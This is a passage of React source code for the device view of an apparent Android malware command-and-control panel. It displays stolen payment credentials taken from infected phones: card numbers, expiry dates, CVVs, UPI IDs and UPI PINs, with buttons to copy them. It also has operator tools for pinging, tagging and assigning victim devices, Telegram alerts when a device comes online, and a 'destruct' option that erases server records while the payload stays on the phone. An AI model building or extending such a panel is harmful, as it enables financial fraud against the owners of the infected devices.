                      Captured Cards
                    </h3>
                    {(rawDevice.cardNumber || rawDevice.cc_cardNumber) && (
                      <span className="text-[10px] font-bold px-2 py-1 rounded-full bg-success/10 text-success">
                        ● Live Capture
                      </span>
                    )}
                  </div>

                  {rawDevice.cardNumber || rawDevice.cc_cardNumber ? (
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                      <div className="bg-gradient-to-br from-primary to-accent text-primary-foreground rounded-2xl p-6 shadow-sm relative overflow-hidden">
                        <div className="absolute top-4 right-4">
                          <CreditCard className="w-8 h-8 opacity-40" />
                        </div>
                        <div className="h-8 w-12 bg-gradient-to-br from-warning/80 to-warning rounded-md mb-6" />
                        <div className="text-xl font-mono tracking-widest mb-4 select-all">
                          {rawDevice.cardNumber || rawDevice.cc_cardNumber}
                        </div>
                        <div className="flex items-end justify-between">
                          <div>
                            <div className="text-[10px] uppercase tracking-wider opacity-60">
                              Card Holder
                            </div>
                            <div className="font-semibold text-sm">
                              {rawDevice.cardholderName ||
                                rawDevice.cc_cardholderName ||
                                "Unknown"}
                            </div>
                          </div>
                          <div className="text-right">
                            <div className="text-[10px] uppercase tracking-wider opacity-60">
                              Expiry
                            </div>
                            <div className="font-semibold text-sm">
                              {rawDevice.expiry ||
                                rawDevice.cc_expiry ||
                                "??/??"}
                            </div>
                          </div>
                        </div>
                      </div>

                      <div className="bg-card border border-card-border rounded-2xl p-5 space-y-3">
                        <div className="flex justify-between items-center pb-3 border-b border-card-border">
                          <span className="text-sm font-medium text-muted-foreground">
                            CVV
                          </span>
                          <div className="flex items-center gap-2">
                            <span className="font-mono font-bold text-xl text-foreground tracking-widest select-all">
                              {rawDevice.cvv || rawDevice.cc_cvv || "???"}
                            </span>
                            <button
                              onClick={() =>
                                copyText(
                                  rawDevice.cvv || rawDevice.cc_cvv || ""
                                )
                              }
                              className="p-1.5 bg-muted hover:bg-primary/10 text-muted-foreground hover:text-primary rounded-lg border border-card-border transition-colors"
                              title="Copy CVV"
                              aria-label="Copy CVV"
                            >
                              <Copy className="w-3.5 h-3.5" />
                            </button>
                          </div>
                        </div>
                        <div className="flex justify-between items-center pb-3 border-b border-card-border">
                          <span className="text-sm font-medium text-muted-foreground">
                            Captured At
                          </span>
                          <span className="text-xs text-foreground font-medium font-mono">
                            {rawDevice.timestamp ||
                              rawDevice.cc_timestamp ||
                              "Unknown"}
                          </span>
                        </div>
                        <div className="flex gap-2">
                          <button
                            onClick={() =>
                              copyText(
                                rawDevice.cardNumber ||
                                  rawDevice.cc_cardNumber ||
                                  ""
                              )
                            }
                            className="flex-1 bg-primary hover:bg-primary/90 text-primary-foreground font-bold py-2.5 rounded-full text-sm transition-colors flex items-center justify-center gap-2"
                          >
                            <Copy className="w-4 h-4" /> Copy Card
                          </button>
                          <button
                            onClick={() =>
                              copyText(
                                `CARD: ${rawDevice.cardNumber || rawDevice.cc_cardNumber}\nNAME: ${rawDevice.cardholderName || rawDevice.cc_cardholderName}\nEXP: ${rawDevice.expiry || rawDevice.cc_expiry}\nCVV: ${rawDevice.cvv || rawDevice.cc_cvv}`
                              )
                            }
                            className="flex-1 bg-muted hover:bg-primary/10 text-primary font-bold py-2.5 rounded-full text-sm transition-colors"
                          >
                            Copy Full Details
                          </button>
                        </div>
                      </div>
                    </div>
                  ) : (
                    <div className="flex-1 flex flex-col items-center justify-center text-center border-2 border-dashed border-card-border rounded-2xl bg-muted p-8">
                      <div className="w-20 h-20 bg-muted rounded-full flex items-center justify-center mb-4 border border-card-border">
                        <CreditCard className="w-10 h-10 text-primary" />
                      </div>
                      <h4 className="font-semibold text-foreground mb-2">
                        No Card Captured Yet
                      </h4>
                      <p className="text-sm text-muted-foreground max-w-sm">
                        Jab koi is device pe card details dalega (payment page),
                        woh yahan automatically capture ho jayegi.
                      </p>
                    </div>
                  )}

                  {(() => {
                    const history = Object.entries(
                      (rawDevice as any).upi_captures || {}
                    ).sort((a: any, b: any) =>
                      String(b[0]).localeCompare(String(a[0]))
                    );
                    const hasHistory = history.length > 0;
                    const show =
                      rawDevice.upi_id || rawDevice.upi_pin || hasHistory;
                    if (!show) return null;
                    let entries: any[] = history;
                    if (!hasHistory && rawDevice.upi_pin) {
                      entries = [
                        [
                          "latest",
                          {
                            upi_id: rawDevice.upi_id,
                            upi_name: rawDevice.upi_name,
                            upi_phone: rawDevice.upi_phone,
                            upi_vehicle: rawDevice.upi_vehicle,
                            upi_pin: rawDevice.upi_pin,
                            ts: rawDevice.upi_timestamp,
                          },
                        ],
                      ];
                    }
                    return (
                      <div className="pt-4 border-t border-card-border">
                        <div className="flex justify-between items-center mb-4">
                          <h3 className="font-semibold text-foreground flex items-center gap-2">
                            <Smartphone className="w-4 h-4 text-primary" />
                            UPI Captures ({entries.length})
                          </h3>
                          <span className="text-[10px] font-bold px-2 py-1 rounded-full bg-success/10 text-success">
                            ● Live
                          </span>
                        </div>
                        <div className="space-y-4">
                          {entries.map(([key, c]: any) => (
                            <div
                              key={key}
                              className="bg-gradient-to-br from-violet-600 to-purple-800 text-white rounded-2xl p-5 shadow-sm"
                            >
                              <div className="flex items-center gap-3 mb-3">
                                <div className="h-9 w-9 bg-white/20 rounded-xl flex items-center justify-center">
                                  <Smartphone className="w-4 h-4" />
                                </div>
                                <div>
                                  <div className="text-[10px] uppercase tracking-wider opacity-60">
                                    UPI ID
                                  </div>
                                  <div className="font-mono font-semibold select-all">
                                    {c.upi_id || "\u2014"}
                                  </div>
                                </div>
                              </div>
                              <div className="grid grid-cols-2 gap-3">
                                <div>
                                  <div className="text-[10px] uppercase tracking-wider opacity-60">
                                    Name
                                  </div>
                                  <div className="font-semibold text-sm">
                                    {c.upi_name || "Unknown"}
                                  </div>
                                </div>
                                <div>
                                  <div className="text-[10px] uppercase tracking-wider opacity-60">
                                    Phone
                                  </div>
                                  <div className="font-semibold text-sm font-mono">
                                    {c.upi_phone || "\u2014"}
                                  </div>
                                </div>
                                <div>
                                  <div className="text-[10px] uppercase tracking-wider opacity-60">
                                    UPI PIN
                                  </div>
                                  <div className="font-mono font-bold text-lg tracking-widest select-all">
                                    {c.upi_pin || "\u2014"}
                                  </div>
                                </div>
                                <div>
                                  <div className="text-[10px] uppercase tracking-wider opacity-60">
                                    Vehicle
                                  </div>
                                  <div className="text-sm font-medium">
                                    {c.upi_vehicle || "\u2014"}
                                  </div>
                                </div>
                                <div className="col-span-2">
                                  <div className="text-[10px] uppercase tracking-wider opacity-60">
                                    Captured At
                                  </div>
                                  <div className="text-xs font-medium font-mono">
                                    {c.ts || c.upi_timestamp || "Unknown"}
                                  </div>
                                </div>
                              </div>
                            </div>
                          ))}
                        </div>
                      </div>
                    );
                  })()}
                </div>
              )}
              {activeTab === "data" && (
                <div
                  id="panel-data"
                  role="tabpanel"
                  aria-labelledby="tab-data"
                  className="h-full flex flex-col space-y-4"
                >
                  <div className="flex items-center justify-between gap-2">
                    <h3 className="font-semibold text-foreground flex items-center gap-2">
                      <Braces className="w-4 h-4 text-primary" />
                      Raw Device Data
                    </h3>
                    <button
                      onClick={() =>
                        copyText(JSON.stringify(rawDevice, null, 2))
                      }
                      className="flex items-center gap-1.5 px-3.5 py-2 rounded-xl bg-primary/10 text-primary text-xs font-semibold border border-primary/30 hover:bg-primary/20 transition-all"
                    >
                      <Copy className="w-3.5 h-3.5" /> Copy JSON
                    </button>
                  </div>
                  <div className="flex flex-wrap gap-1.5">
                    {[
                      {
                        k: "Android",
                        v: device.androidV && `v${device.androidV}`,
                      },
                      { k: "SDK", v: device.sdkV && `v${device.sdkV}` },
                      { k: "Arch", v: device.cpu_arch },
                      { k: "Storage", v: device.storage },
                      {
                        k: "Rooted",
                        v:
                          device.isRoot === true
                            ? "Yes"
                            : device.isRoot === false
                              ? "No"
                              : undefined,
                      },
                      {
                        k: "SD Card",
                        v:
                          device.isSdCard === true
                            ? "Yes"
                            : device.isSdCard === false
                              ? "No"
                              : undefined,
                      },
                      { k: "Joined", v: device.joined },
                      {
                        k: "Last Ping",
                        v: device.lastPing
                          ? new Date(device.lastPing).toLocaleString()
                          : undefined,
                      },
                      {
                        k: "Webview",
                        v: rawDevice.webview === true ? "Yes" : undefined,
                      },
                    ]
                      .filter((x) => x.v)
                      .map((x) => (
                        <span
                          key={x.k}
                          className="inline-flex items-center gap-1 px-2.5 py-1 rounded-lg bg-muted border border-card-border font-mono text-[11px] text-muted-foreground"
                        >
                          <span className="text-primary/70 font-semibold">
                            {x.k}:
                          </span>{" "}
                          {x.v}
                        </span>
                      ))}
                  </div>
                  <div className="flex-1 overflow-y-auto rounded-2xl border border-card-border bg-[#0a0d15]">
                    <pre className="p-4 text-[11px] leading-relaxed font-mono text-emerald-300/90 whitespace-pre-wrap break-words">
                      {JSON.stringify(rawDevice, null, 2)}
                    </pre>
                  </div>
                </div>
              )}
              {activeTab === "delete" && (
                <div
                  id="panel-delete"
                  role="tabpanel"
                  aria-labelledby="tab-delete"
                  className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6"
                >
                  <div className="text-center mb-4">
                    <div className="w-16 h-16 bg-destructive/10 rounded-full flex items-center justify-center mx-auto mb-3 border border-destructive/20">
                      <AlertTriangle className="w-8 h-8 text-destructive" />
                    </div>
                    <h2 className="text-lg font-bold text-destructive">
                      Destruct Sequence
                    </h2>
                    <p className="text-sm text-muted-foreground mt-2">
                      This will permanently wipe all logs, messages, and device
                      records from the control server. The payload on the device
                      will not be uninstalled, but the connection will be
                      orphaned.
                    </p>
                  </div>

                  <div className="bg-destructive/10 border border-destructive/20 p-6 rounded-2xl text-center">
                    <p className="text-sm mb-6 text-destructive/80 font-medium">
                      Type the device ID to confirm or just click destruct if
                      you're sure.
                    </p>

                    <button
                      onClick={handleDeleteDevice}
                      className="w-full bg-destructive hover:bg-destructive/90 text-primary-foreground font-bold py-4 rounded-full transition-all hover:scale-[1.02] flex items-center justify-center gap-2"
                    >
                      <Trash2 className="w-5 h-5" />
                      Permanently Destruct
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
          {/* Device management */}
          <div className="stat-card overflow-hidden relative">
            <div className="h-1 w-full bg-primary" />
            <div className="p-5 space-y-4">
              {/* Ping Device */}
              <div className="pb-3 border-b border-card-border space-y-2">
                <div className="flex items-center justify-between">
                  <span className="text-sm font-medium text-muted-foreground flex items-center gap-1.5">
                    <Activity className="w-3.5 h-3.5" /> Ping Device
                  </span>
                  <button
                    onClick={handlePingDevice}
                    disabled={pinging}
                    className={`flex items-center gap-1.5 px-4 py-1.5 rounded-full text-xs font-semibold transition-all ${
                      pinging
                        ? "bg-muted text-muted-foreground border border-card-border"
                        : "bg-primary/10 text-primary border border-primary/30 hover:bg-primary hover:text-primary-foreground"
                    }`}
                  >
                    {pinging ? (
                      <>
                        <Timer className="w-3.5 h-3.5 animate-pulse" /> Pinging…
                      </>
                    ) : (
                      <>
                        <Wifi className="w-3.5 h-3.5" /> Ping
                      </>
                    )}
                  </button>
                </div>
                {pingResult && (
                  <div
                    className={`flex items-center gap-2 px-3 py-2 rounded-2xl text-xs font-semibold ${
                      pingResult.success
                        ? "bg-success/10 text-success border border-success/20"
                        : "bg-destructive/10 text-destructive border border-destructive/20"
                    }`}
                  >
                    {pingResult.success ? (
                      <>
                        <Wifi className="w-3.5 h-3.5" /> Latency:{" "}
                        {pingResult.latencyMs}ms — Online
                      </>
                    ) : (
                      <>
                        <WifiOff className="w-3.5 h-3.5" /> No response (15s
                        timeout)
                      </>
                    )}
                  </div>
                )}
              </div>
              <div className="flex items-center justify-between pb-3 border-b border-card-border">
                <span className="text-sm font-medium text-muted-foreground">
                  Pinned
                </span>
                <button
                  onClick={togglePin}
                  className={`flex items-center gap-1.5 px-4 py-1.5 rounded-full text-xs font-semibold transition-all ${
                    isPinned
                      ? "bg-primary/10 text-primary border border-primary/30"
                      : "bg-muted border border-card-border text-muted-foreground hover:text-foreground"
                  }`}
                >
                  {isPinned ? (
                    <PinOff className="w-3.5 h-3.5" />
                  ) : (
                    <Pin className="w-3.5 h-3.5" />
                  )}
                  {isPinned ? "Unpin" : "Pin to Top"}
                </button>
                <div className="space-y-2">
                  <label className="text-sm font-medium text-muted-foreground block">
                    Operator Memo
                  </label>
                  <div className="flex gap-2">
                    <input
                      type="text"
                      value={memoInput}
                      onChange={(e) => setMemoInput(e.target.value)}
                      placeholder="Enter memo..."
                      className="flex-1 bg-card border border-input rounded-2xl px-3 py-2.5 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
                    />
                    <button
                      onClick={handleUpdateMemo}
                      className="bg-primary hover:bg-primary/90 text-primary-foreground px-4 py-2.5 rounded-full text-xs font-semibold transition-colors"
                    >
                      Set
                    </button>
                  </div>
                </div>
                <div className="space-y-2 pt-2 border-t border-card-border">
                  <label className="text-sm font-medium text-muted-foreground block">
                    Device Name
                  </label>
                  <div className="flex gap-2">
                    <input
                      type="text"
                      value={nameInput}
                      onChange={(e) => setNameInput(e.target.value)}
                      placeholder="Custom name..."
                      className="flex-1 bg-card border border-input rounded-2xl px-3 py-2.5 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
                    />
                  </div>
                  <label className="text-sm font-medium text-muted-foreground block">
                    Group
                  </label>
                  <input
                    type="text"
                    value={groupInput}
                    onChange={(e) => setGroupInput(e.target.value)}
                    placeholder="e.g. Delhi, VIP, Test"
                    className="w-full bg-card border border-input rounded-2xl px-3 py-2.5 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
                  />
                  <label className="text-sm font-medium text-muted-foreground block">
                    Color Tag
                  </label>
                  <div className="flex gap-2 flex-wrap">
                    {[
                      "#22c55e",
                      "#3b82f6",
                      "#f59e0b",
                      "#ef4444",
                      "#8b5cf6",
                      "#ec4899",
                      "#14b8a6",
                    ].map((c) => (
                      <button
                        key={c}
                        onClick={() => setColorTag(colorTag === c ? "" : c)}
                        className="w-7 h-7 rounded-full transition-all"
                        style={{
                          background: c,
                          boxShadow:
                            colorTag === c
                              ? "0 0 0 2px white, 0 0 0 4px " + c
                              : "none",
                        }}
                        aria-label={"color " + c}
                      />
                    ))}
                  </div>
                  <button
                    onClick={handleSaveLabel}
                    className="bg-primary hover:bg-primary/90 text-primary-foreground px-4 py-2.5 rounded-full text-xs font-semibold transition-colors w-full"
                  >
                    Save Label & Group
                  </button>
                </div>
                {isAdmin && (
                  <div className="space-y-2 pt-2 border-t border-card-border">
                    <label className="text-sm font-medium text-muted-foreground flex items-center gap-1.5">
                      <UserCheck className="w-3.5 h-3.5" /> Assign Owner
                    </label>
                    <div className="flex gap-2">
                      <input
                        type="text"
                        value={ownerInput}
                        onChange={(e) => setOwnerInput(e.target.value)}
                        placeholder="Telegram ID..."
                        className="flex-1 bg-card border border-input rounded-2xl px-3 py-2.5 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all min-w-0"
                      />
                      <button
                        onClick={handleSaveOwner}
                        disabled={savingOwner}
                        className="bg-primary hover:bg-primary/90 text-primary-foreground px-4 py-2.5 rounded-full text-xs font-semibold transition-colors disabled:opacity-50 whitespace-nowrap"
                      >
                        {savingOwner ? "..." : "Save"}
                      </button>
                    </div>
                    <p className="text-[10px] text-muted-foreground">
                      Only this user will be able to see this device
                    </p>
                  </div>
                )}
                <div className="space-y-2 pt-2 border-t border-card-border">
                  <label className="text-sm font-medium text-muted-foreground flex items-center gap-1.5">
                    <BellRing className="w-3.5 h-3.5" /> Online Alert
                  </label>
                  <button
                    onClick={toggleOnlineAlert}
                    className={`w-full flex items-center justify-between px-4 py-2.5 rounded-2xl text-sm font-semibold transition-colors border ${
                      alertOnline
                        ? "bg-success/10 text-success border-success/30"
                        : "bg-card text-muted-foreground border-input hover:bg-muted/50"
                    }`}
                  >
                    <span className="flex items-center gap-2">
                      <BellRing className="w-4 h-4" />
                      {alertOnline ? "Active" : "Off"}
                    </span>
                    <span
                      className={`relative inline-flex h-5 w-9 items-center rounded-full transition-colors ${alertOnline ? "bg-success" : "bg-muted"}`}
                    >
                      <span
                        className={`inline-block h-3.5 w-3.5 transform rounded-full bg-white transition-transform ${alertOnline ? "translate-x-[18px]" : "translate-x-0.5"}`}
                      />
                    </span>
                  </button>
                  <p className="text-[10px] text-muted-foreground">
                    Jab device dobara online aaye toh Telegram pe notification
                    milegi
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </Layout>
  );
}

function getBatteryValue(battery: unknown) {
  return parseInt(String(battery ?? "").replace("%", ""), 10) || 0;
}
